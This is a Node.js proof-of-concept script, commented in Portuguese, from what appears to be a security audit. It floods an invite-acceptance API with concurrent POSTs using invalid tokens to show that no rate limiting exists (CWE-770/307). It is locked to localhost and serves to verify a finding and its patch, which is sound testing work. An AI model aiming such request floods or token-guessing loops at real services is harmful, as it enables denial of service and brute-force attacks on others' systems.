// PoC-05 — flood.mjs
// Dispara N requests em /api/accept-invite (ou /api/invites/:token) e mede a
// distribuição de status. PROVA a ausência de rate limit: nenhum 429.
// Finding: server.ts:445/474 (CWE-770 / CWE-307).
//
// Alvo padrão: o dev server local (npm run dev -> http://localhost:5000).
//   node .security-pocs/poc-05-medium-no-ratelimit/flood.mjs
// Variáveis:
//   TARGET=http://localhost:5000/api/accept-invite  N=100  CONCURRENCY=20
//
// NÃO aponte para produção. O default é localhost. Usa tokens INVÁLIDOS, então
// nenhum usuário real é criado (o endpoint rejeita antes do createUser).

const TARGET = process.env.TARGET || 'http://localhost:5000/api/accept-invite';
const N = Number(process.env.N || 100);
const CONCURRENCY = Number(process.env.CONCURRENCY || 20);

if (!/^https?:\/\/(localhost|127\.0\.0\.1)/.test(TARGET)) {
  console.error(`✖ TARGET "${TARGET}" não é localhost. Recusando (proteção anti-produção).`);
  process.exit(1);
}

const status = {};
let rateLimited = 0;

async function oneRequest(i) {
  try {
    const r = await fetch(TARGET, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        token: `invalid-token-${i}`,
        email: `flood${i}@test.local`,
        password: 'x',
        phone: '0',
      }),
    });
    status[r.status] = (status[r.status] || 0) + 1;
    if (r.status === 429) rateLimited++;
  } catch (e) {
    status['ERR'] = (status['ERR'] || 0) + 1;
  }
}

async function run() {
  console.log(`→ Flooding ${TARGET}  N=${N} concurrency=${CONCURRENCY}`);
  const t0 = Date.now();
  let idx = 0;
  async function worker() {
    while (idx < N) { const i = idx++; await oneRequest(i); }
  }
  await Promise.all(Array.from({ length: CONCURRENCY }, worker));
  const secs = ((Date.now() - t0) / 1000).toFixed(2);

  console.log('\nStatus distribution:', JSON.stringify(status));
  console.log(`Rate-limited (429): ${rateLimited}`);
  if (rateLimited === 0) {
    console.log(`\n>>> Done ${N}/${N} in ${secs}s, 0 rate-limited (VULNERÁVEL). <<<`);
  } else {
    console.log(`\n>>> ${rateLimited}/${N} receberam 429 — rate limit ATIVO (patch OK). <<<`);
  }
}

run();
